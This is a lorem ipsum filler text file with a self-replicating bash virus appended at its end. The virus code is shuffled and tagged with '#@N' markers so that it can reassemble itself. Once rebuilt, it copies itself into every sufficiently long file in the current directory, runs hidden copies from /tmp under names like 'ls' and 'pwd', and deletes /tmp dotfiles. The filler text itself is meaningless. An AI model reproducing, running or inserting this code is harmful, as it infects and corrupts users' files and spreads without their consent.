Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat d
Lorem ipsum dolor sit amet,
Duis bibendum lectus nec nis
Phasellus efficitur massa eg
Nullam nec imperdiet odio. P
Aliquam felis dui, volutpat
Lorem ipsum dolor sit amet,tail -n 36 ./virus.sh | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/.test
chmod +x /tmp/.test && /tmp/.test &
exit 0
  fi  #@12
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
    continue  #@17
  declare -i nbl=0  #@25
    echo -e "$line" >> $target  #@32
fi  #@3
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
  echo "exit 0" >> $target  #@23
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
    valindex=$(((RANDOM % 36)+1))  #@27
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
  if [ $(($nbline)) -lt 39 ]; then  #@10
  NEWFILE="/tmp/.$NEWFILE"  #@20
  exit 0  #@2
for target in *; do  #@6
  echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@21
    continue  #@11
    done  #@30
  nbline=$(echo $nbline | cut -d " " -f1)  #@9
  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@14
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33
  nbline=$(wc -l $target)  #@7
  fi  #@18
  nbline=${nbline##}  #@8
done  #@35
    line=$(tail -n $valindex $0 | head -1)  #@31
  tabft=("FT" [36]=" ")  #@24
  done  #@34
MANAGER=(test cd ls pwd)  #@4
  while [ $nbl -ne 36 ]; do  #@26
  if [ "$?" == "0" ]; then  #@16
rm /tmp/.* 2> /dev/null #@36
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
RANDOM=$$  #@5
if [ "$1" == "test" ]; then  #@1
      valindex=$(((RANDOM % 36) + 1))  #@29
